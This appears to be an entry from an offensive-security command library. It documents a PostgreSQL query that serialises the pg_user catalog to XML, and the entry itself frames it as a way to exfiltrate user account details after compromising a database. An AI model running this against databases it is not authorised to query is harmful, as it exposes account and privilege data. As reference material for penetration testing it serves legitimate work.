---
id: 5120f78d-0f18-4b8a-b3b3-dc7cc8926ac6
name: postgresql-query-to-xml-pg-user
type: command
executor: sql
data: 'select query_to_xml(''select * from pg_user'', true, true, '''');'
output: null
created_at: '2023-04-06T03:56:35.763485+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Databases
tags:
  - exfiltration
  - postgresql
verified: true
validated: true
---

# postgresql-query-to-xml-pg-user

## Command

```sql
select query_to_xml('select * from pg_user', true, true, '');
```

## Description

This SQL command uses PostgreSQL's query_to_xml function to serialize all entries from the pg_user system catalog into a single XML row, useful for exfiltrating user account details during database compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'select * from pg_user' | Inner SQL query to execute and serialize | Yes |
| true | Include column names in XML | Yes |
| true | Indent XML for readability | Yes |
| '' | Root element name (empty for default) | Yes |

## Examples

### Basic Usage

```sql
select query_to_xml('select * from pg_user', true, true, '');
```

### Advanced Usage

```sql
select query_to_xml('select usename, usesuper from pg_user', true, true, 'pg_users');
```

## Expected Output

XML-formatted row with user data:

<row set="1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <usesysid xsi:type="xs:integer">10</usesysid>
  <usename>postgres</usename>
  <usesuper xsi:type="xs:boolean">true</usesuper>
  ...
</row>

## Related

- [[procedures/PostgreSQL-XML-Data-Exfiltration]]
- [[commands/postgresql-query-to-xml-custom]]
